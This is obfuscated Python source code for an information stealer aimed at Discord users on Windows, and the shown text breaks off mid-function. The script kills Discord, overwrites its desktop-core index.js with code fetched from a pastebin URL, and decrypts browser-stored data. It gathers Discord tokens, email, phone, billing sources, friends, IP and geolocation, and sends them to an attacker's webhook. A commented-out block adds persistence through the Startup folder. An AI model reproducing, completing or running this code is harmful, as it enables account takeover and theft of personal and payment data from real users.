import os #line:1
import threading #line:2
from sys import executable #line:3
from sqlite3 import connect as sql_connect #line:4
import re #line:5
from base64 import b64decode #line:6
from json import loads as json_loads ,load #line:7
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8
from urllib .request import Request ,urlopen #line:9
from json import *#line:10
import time #line:11
import shutil #line:12
from zipfile import ZipFile #line:13
import random #line:14
import re #line:15
import subprocess #line:16
import sys #line:17
import shutil #line:18
import uuid #line:19
import socket #line:20
import getpass #line:21
DETECTED =False #line:24
def g3t1p ():#line:26
    O0O0OOOO0OOOOO00O ="None"#line:27
    try :#line:28
        O0O0OOOO0OOOOO00O =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:29
    except :#line:30
        pass #line:31
    return O0O0OOOO0OOOOO00O #line:32
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:37
for modl in requirements :#line:38
    try :__import__ (modl [0 ])#line:39
    except :#line:40
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:41
        time .sleep (3 )#line:42
import requests #line:44
from Crypto .Cipher import AES #line:45
local =os .getenv ('LOCALAPPDATA')#line:47
roaming =os .getenv ('APPDATA')#line:48
temp =os .getenv ("TEMP")#line:49
Threadlist =[]#line:50
class DATA_BLOB (Structure ):#line:53
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:57
def G3tD4t4 (O00OOOOO0O0OOO0O0 ):#line:59
    O0O0O0000O0O0OO0O =int (O00OOOOO0O0OOO0O0 .cbData )#line:60
    OOOO0OO00O00OOOOO =O00OOOOO0O0OOO0O0 .pbData #line:61
    OOOO0OOO000O0OO0O =c_buffer (O0O0O0000O0O0OO0O )#line:62
    cdll .msvcrt .memcpy (OOOO0OOO000O0OO0O ,OOOO0OO00O00OOOOO ,O0O0O0000O0O0OO0O )#line:63
    windll .kernel32 .LocalFree (OOOO0OO00O00OOOOO )#line:64
    return OOOO0OOO000O0OO0O .raw #line:65
def CryptUnprotectData (O0OO000O00O0O0OO0 ,entropy =b''):#line:67
    OOO0O0OOO0OOOOOOO =c_buffer (O0OO000O00O0O0OO0 ,len (O0OO000O00O0O0OO0 ))#line:68
    OO0O000O0OO0O0OO0 =c_buffer (entropy ,len (entropy ))#line:69
    OOOO0000OOO00O000 =DATA_BLOB (len (O0OO000O00O0O0OO0 ),OOO0O0OOO0OOOOOOO )#line:70
    O0OO0OO0O0000000O =DATA_BLOB (len (entropy ),OO0O000O0OO0O0OO0 )#line:71
    O00OO0O0OO00OOOOO =DATA_BLOB ()#line:72
    if windll .crypt32 .CryptUnprotectData (byref (OOOO0000OOO00O000 ),None ,byref (O0OO0OO0O0000000O ),None ,None ,0x01 ,byref (O00OO0O0OO00OOOOO )):#line:74
        return G3tD4t4 (O00OO0O0OO00OOOOO )#line:75
def D3kryptV4lU3 (OOOO0OOOO0O0OO0OO ,master_key =None ):#line:77
    O0OOOO0OO0O0OO0OO =OOOO0OOOO0O0OO0OO .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:78
    if O0OOOO0OO0O0OO0OO =='v10'or O0OOOO0OO0O0OO0OO =='v11':#line:79
        OO0O0O0OOO0OO000O =OOOO0OOOO0O0OO0OO [3 :15 ]#line:80
        O00OO0OOOOOOOOO0O =OOOO0OOOO0O0OO0OO [15 :]#line:81
        OO0OO0OO0O0O0O000 =AES .new (master_key ,AES .MODE_GCM ,OO0O0O0OOO0OO000O )#line:82
        OO0O000OO0OOO000O =OO0OO0OO0O0O0O000 .decrypt (O00OO0OOOOOOOOO0O )#line:83
        OO0O000OO0OOO000O =OO0O000OO0OOO000O [:-16 ].decode ()#line:84
        return OO0O000OO0OOO000O #line:85
def L04dR3qu3sTs (OOOOO0O00OO00O000 ,OO00O000OOOO0000O ,data ='',files ='',headers =''):#line:87
    for OOOOOO00O00OO0OOO in range (8 ):#line:88
        try :#line:89
            if OOOOO0O00OO00O000 =='POST':#line:90
                if data !='':#line:91
                    O00OO0O00O00O0000 =requests .post (OO00O000OOOO0000O ,data =data )#line:92
                    if O00OO0O00O00O0000 .status_code ==200 :#line:93
                        return O00OO0O00O00O0000 #line:94
                elif files !='':#line:95
                    O00OO0O00O00O0000 =requests .post (OO00O000OOOO0000O ,files =files )#line:96
                    if O00OO0O00O00O0000 .status_code ==200 or O00OO0O00O00O0000 .status_code ==413 :#line:97
                        return O00OO0O00O00O0000 #line:98
        except :#line:99
            pass #line:100
def L04durl1b (O00000O000OO0OO00 ,data ='',files ='',headers =''):#line:102
    for O0OOO00O0OO0OOOO0 in range (8 ):#line:103
        try :#line:104
            if headers !='':#line:105
                O00OOOO0O0OOOOOO0 =urlopen (Request (O00000O000OO0OO00 ,data =data ,headers =headers ))#line:106
                return O00OOOO0O0OOOOOO0 #line:107
            else :#line:108
                O00OOOO0O0OOOOOO0 =urlopen (Request (O00000O000OO0OO00 ,data =data ))#line:109
                return O00OOOO0O0OOOOOO0 #line:110
        except :#line:111
            pass #line:112
def globalInfo ():#line:114
    OOOO0O0OOO0OOOOO0 =g3t1p ()#line:115
    OO0O0O0O0OOO0OO0O =os .getenv ("USERNAME")#line:116
    O0OOO000O0O0O0000 =urlopen (Request (f"https://geolocation-db.com/jsonp/{OOOO0O0OOO0OOOOO0}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:117
    O0OO00OO0000O0000 =loads (O0OOO000O0O0O0000 )#line:118
    OO00OO00O0OO0OO0O =O0OO00OO0000O0000 ["country_name"]#line:119
    O0O0O00O0OOOO0O0O =O0OO00OO0000O0000 ["country_code"].lower ()#line:120
    OOO00O0OOOOOO000O =O0OO00OO0000O0000 ["state"]#line:121
    O0OO000O0O0O00O00 =f":flag_{O0O0O00O0OOOO0O0O}:  - `{OO0O0O0O0OOO0OO0O.upper()} | {OOOO0O0OOO0OOOOO0} ({OO00OO00O0OO0OO0O})`"#line:123
    return O0OO000O0O0O00O00 #line:124
def TR6st (OO0OO00OOO00O0O00 ):#line:127
    global DETECTED #line:128
    O000OO0OOOOO0OOOO =str (OO0OO00OOO00O0O00 )#line:129
    O0O00O00O000OOOOO =re .findall (".google.com",O000OO0OOOOO0OOOO )#line:130
    if len (O0O00O00O000OOOOO )<-1 :#line:131
        DETECTED =True #line:132
        return DETECTED #line:133
    else :#line:134
        DETECTED =False #line:135
        return DETECTED #line:136
def G3tUHQFr13ndS (OOOO0000OOOO0000O ):#line:138
    OOO000O0OOO000OO0 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:150
    OO0OO00OO0O00OO00 ={"Authorization":OOOO0000OOOO0000O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:155
    try :#line:156
        O0000OOO0O0O00OOO =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =OO0OO00OO0O00OO00 )).read ().decode ())#line:157
    except :#line:158
        return False #line:159
    OOOOOO000O000000O =''#line:161
    for OO000OOO000O0OO00 in O0000OOO0O0O00OOO :#line:162
        O0OOOO000000O0OOO =''#line:163
        O00000OOOOOOO0000 =OO000OOO000O0OO00 ['user']['public_flags']#line:164
        for O0O0O0O0OOOO00000 in OOO000O0OOO000OO0 :#line:165
            if O00000OOOOOOO0000 //O0O0O0O0OOOO00000 ["Value"]!=0 and OO000OOO000O0OO00 ['type']==1 :#line:166
                if not "House"in O0O0O0O0OOOO00000 ["Name"]:#line:167
                    O0OOOO000000O0OOO +=O0O0O0O0OOOO00000 ["Emoji"]#line:168
                O00000OOOOOOO0000 =O00000OOOOOOO0000 %O0O0O0O0OOOO00000 ["Value"]#line:169
        if O0OOOO000000O0OOO !='':#line:170
            OOOOOO000O000000O +=f"{O0OOOO000000O0OOO} | {OO000OOO000O0OO00['user']['username']}#{OO000OOO000O0OO00['user']['discriminator']} ({OO000OOO000O0OO00['user']['id']})\n"#line:171
    return OOOOOO000O000000O #line:172
process_list =os .popen ('tasklist').readlines ()#line:175
for process in process_list :#line:178
    if "Discord"in process :#line:179
        pid =int (process .split ()[1 ])#line:181
        os .system (f"taskkill /F /PID {pid}")#line:182
def G3tb1ll1ng (O00OO00OOOOO0000O ):#line:184
    O0OO00000O00O0O00 ={"Authorization":O00OO00OOOOO0000O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:189
    try :#line:190
        O0OO00OO0O0OOOOOO =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =O0OO00000O00O0O00 )).read ().decode ())#line:191
    except :#line:192
        return False #line:193
    if O0OO00OO0O0OOOOOO ==[]:return "```None```"#line:195
    O0OOO000O000OOOOO =""#line:197
    for O000O000O000O00O0 in O0OO00OO0O0OOOOOO :#line:198
        if O000O000O000O00O0 ["invalid"]==False :#line:199
            if O000O000O000O00O0 ["type"]==1 :#line:200
                O0OOO000O000OOOOO +=":credit_card:"#line:201
            elif O000O000O000O00O0 ["type"]==2 :#line:202
                O0OOO000O000OOOOO +=":parking: "#line:203
    return O0OOO000O000OOOOO #line:205
inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ="https://pastebin.com/raw/BsZ18N9J"#line:207
def keywork ():#line:209
    O0000000O0OOO0O00 =os .getlogin ()#line:211
    O0O00O0O0O0000OOO =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:213
    for OO0O000OOO0OOO0OO in O0O00O0O0O0000OOO :#line:215
        OO0000O0O0OO00O00 =os .path .join (os .getenv ('LOCALAPPDATA'),OO0O000OOO0OOO0OO )#line:216
        if os .path .isdir (OO0000O0O0OO00O00 ):#line:217
            for O0000OO000O0O0000 ,O0O0OOO00OO0OO000 ,OOOOO000O0OOOO000 in os .walk (OO0000O0O0OO00O00 ):#line:218
                if 'app-'in O0000OO000O0O0000 :#line:219
                    for OOO0OOO0O0O0O0OO0 in O0O0OOO00OO0OO000 :#line:220
                        if 'modules'in OOO0OOO0O0O0O0OO0 :#line:221
                            O0000OO00OOO00O00 =os .path .join (O0000OO000O0O0000 ,OOO0OOO0O0O0O0OO0 )#line:222
                            for OOOO0000000O000O0 ,O0OO0OO0O00OO0000 ,OO00O00OOO00000OO in os .walk (O0000OO00OOO00O00 ):#line:223
                                if 'discord_desktop_core-'in OOOO0000000O000O0 :#line:224
                                    for O000O00OO00OO00O0 ,O0000000OO000O0OO ,OOO0000O0O000O0O0 in os .walk (OOOO0000000O000O0 ):#line:225
                                        if 'discord_desktop_core'in O000O00OO00OO00O0 :#line:226
                                            for OOO0O0O00OOOO0O0O in OOO0000O0O000O0O0 :#line:227
                                                if OOO0O0O00OOOO0O0O =='index.js':#line:228
                                                    OOO0OO0OOO00O000O =os .path .join (O000O00OO00OO00O0 ,OOO0O0O00OOOO0O0O )#line:229
                                                    OOOO0O00O0O0OOO00 =requests .get (inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ).text #line:231
                                                    OOOO0O00O0O0OOO00 =OOOO0O00O0O0OOO00 .replace ("%WEBHOOK%",keyfast67f )#line:233
                                                    with open (OOO0OO0OOO00O000O ,"w",encoding ="utf-8")as O0OO00O0OOOO0OOO0 :#line:235
                                                        O0OO00O0OOOO0OOO0 .write (OOOO0O00O0O0OOO00 )#line:236
keywork ()#line:237
def G3tB4dg31 (O00000OOOO0000O0O ):#line:239
    if O00000OOOO0000O0O ==0 :return ''#line:240
    O0O00000OOO0OOO0O =''#line:242
    O00000OO0OOO0000O =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:254
    for OOOO0OO0O00O000O0 in O00000OO0OOO0000O :#line:255
        if O00000OOOO0000O0O //OOOO0OO0O00O000O0 ["Value"]!=0 :#line:256
            O0O00000OOO0OOO0O +=OOOO0OO0O00O000O0 ["Emoji"]#line:257
            O00000OOOO0000O0O =O00000OOOO0000O0O %OOOO0OO0O00O000O0 ["Value"]#line:258
    return O0O00000OOO0OOO0O #line:260
def G3tT0k4n1nf9 (OOOO00OO00000O000 ):#line:262
    O000000O0O0O000O0 ={"Authorization":OOOO00OO00000O000 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:267
    OOO0O000OO0OOO000 =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O000000O0O0O000O0 )).read ().decode ())#line:269
    O00O00OO0O0O0O000 =OOO0O000OO0OOO000 ["username"]#line:270
    OOO000OOOO00O0O0O =OOO0O000OO0OOO000 ["discriminator"]#line:271
    OOOO0OO0O0O00OOOO =OOO0O000OO0OOO000 ["email"]#line:272
    OO000000OO00O00O0 =OOO0O000OO0OOO000 ["id"]#line:273
    O00OO000O0O0OOOO0 =OOO0O000OO0OOO000 ["avatar"]#line:274
    OOO00OOOO0O00OO00 =OOO0O000OO0OOO000 ["public_flags"]#line:275
    OOO000O0O0000O0O0 =""#line:276
    O000O0O0000OOOO00 =""#line:277
    if "premium_type"in OOO0O000OO0OOO000 :#line:279
        O0OOOO0OOOO0OO0OO =OOO0O000OO0OOO000 ["premium_type"]#line:280
        if O0OOOO0OOOO0OO0OO ==1 :#line:281
            OOO000O0O0000O0O0 ="<a:DE_BadgeNitro:865242433692762122>"#line:282
        elif O0OOOO0OOOO0OO0OO ==2 :#line:283
            OOO000O0O0000O0O0 ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:284
    if "ph0n3"in OOO0O000OO0OOO000 :O000O0O0000OOOO00 =f'{OOO0O000OO0OOO000["ph0n3"]}'#line:285
    return O00O00OO0O0O0O000 ,OOO000OOOO00O0O0O ,OOOO0OO0O0O00OOOO ,OO000000OO00O00O0 ,O00OO000O0O0OOOO0 ,OOO00OOOO0O00OO00 ,OOO000O0O0000O0O0 ,O000O0O0000OOOO00 #line:287
def ch1ckT4k1n (OO00OO00O000O00O0 ):#line:289
    OOO0O0O00OO000OOO ={"Authorization":OO00OO00O000O00O0 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:294
    try :#line:295
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OOO0O0O00OO000OOO ))#line:296
        return True #line:297
    except :#line:298
        return False #line:299
"""if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)"""#line:314
def upl05dT4k31 (O0O0OO0O0O0OOO000 ,OOO00OOO0O0O0000O ):#line:317
    global keyfast67f #line:318
    O00OO0OO000O0O0OO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:322
    O0OO0O0OOO000O00O ,O0000000000000O00 ,O0O0000O0OO0O0OO0 ,OOOO0O0O0O0OO0000 ,O0000000000OO0O0O ,O0OOO00OO00OOO00O ,O0O00O0O0OOOO0O0O ,OOOO0O0OOO0O0OO0O =G3tT0k4n1nf9 (O0O0OO0O0O0OOO000 )#line:323
    if O0000000000OO0O0O ==None :#line:325
        O0000000000OO0O0O =""#line:326
    else :#line:327
        O0000000000OO0O0O =f"https://cdn.discordapp.com/avatars/{OOOO0O0O0O0OO0000}/{O0000000000OO0O0O}"#line:328
    O00OOO0OO00O00000 =G3tb1ll1ng (O0O0OO0O0O0OOO000 )#line:330
    OOOOO000O000O0OOO =G3tB4dg31 (O0OOO00OO00OOO00O )#line:331
    OO0O000OOOO0OOOOO =G3tUHQFr13ndS (O0O0OO0O0O0OOO000 )#line:332
    if OO0O000OOOO0OOOOO =='':OO0O000OOOO0OOOOO ="```No Rare Friends```"#line:333
    if not O00OOO0OO00O00000 :#line:334
        OOOOO000O000O0OOO ,OOOO0O0OOO0O0OO0O ,O00OOO0OO00O00000 ="🔒","🔒","🔒"#line:335
    if O0O00O0O0OOOO0O0O ==''and OOOOO000O000O0OOO =='':O0O00O0O0OOOO0O0O ="```None```"#line:336
    OOO00000O0OO0OO0O ={"content":f'{globalInfo()} | `{OOO00OOO0O0O0000O}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{O0O0OO0O0O0OOO000}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{O0O0000O0OO0O0OO0}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{OOOO0O0OOO0O0OO0O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{O0O00O0O0OOOO0O0O}{OOOOO000O000O0OOO}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{O00OOO0OO00O00000}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{OO0O000OOOO0OOOOO}","inline":False }],"author":{"name":f"{O0OO0O0OOO000O00O}#{O0000000000000O00} ({OOOO0O0O0O0OO0000})","icon_url":f"{O0000000000OO0O0O}"},"footer":{"text":"unknown","icon_url":""},"thumbnail":{"url":f"{O0000000000OO0O0O}"}}],"avatar_url":"","username":"unknown","attachments":[]}#line:396
    L04durl1b (keyfast67f ,data =dumps (OOO00000O0OO0OO0O ).encode (),headers =O00OO0OO000O0O0OO )#line:397
def R4f0rm3t (O0OOOOO000OO0OO0O ):#line:400
    OOO000OOOOO000O00 =re .findall ("(\w+[a-z])",O0OOOOO000OO0OO0O )#line:401
    while "https"in OOO000OOOOO000O00 :OOO000OOOOO000O00 .remove ("https")#line:402
    while "com"in OOO000OOOOO000O00 :OOO000OOOOO000O00 .remove ("com")#line:403
    while "net"in OOO000OOOOO000O00 :OOO000OOOOO000O00 .remove ("net")#line:404
    return list (set (OOO000OOOOO000O00 ))#line:405
def upload (OOO000OOO0OOOOO0O ,OOOO0OO0O0O00000O ):#line:407
    OOO0OO00000O0OOOO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:411
    if OOO000OOO0OOOOO0O =="crcook":#line:413
        O0O00O00000OO000O =' | '.join (OOOOOOOO00OOO00OO for OOOOOOOO00OOO00OO in cookiWords )#line:414
        if len (O0O00O00000OO000O )>1000 :#line:415
            O000O00O00OO0O0O0 =R4f0rm3t (str (cookiWords ))#line:416
            O0O00O00000OO000O =' | '.join (O0OOO0O00OO000O00 for O0OOO0O00OO000O00 in O000O00O00OO0O0O0 )#line:417
        O00O0000OO0O0O0O0 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{O0O00O00000OO000O}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownCookies.txt]({OOOO0OO0O0O00000O})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg","attachments":[]}#line:434
        L04durl1b (keyfast67f ,data =dumps (O00O0000OO0O0O0O0 ).encode (),headers =OOO0OO00000O0OOOO )#line:435
        return #line:436
    if OOO000OOO0OOOOO0O =="crpassw":#line:438
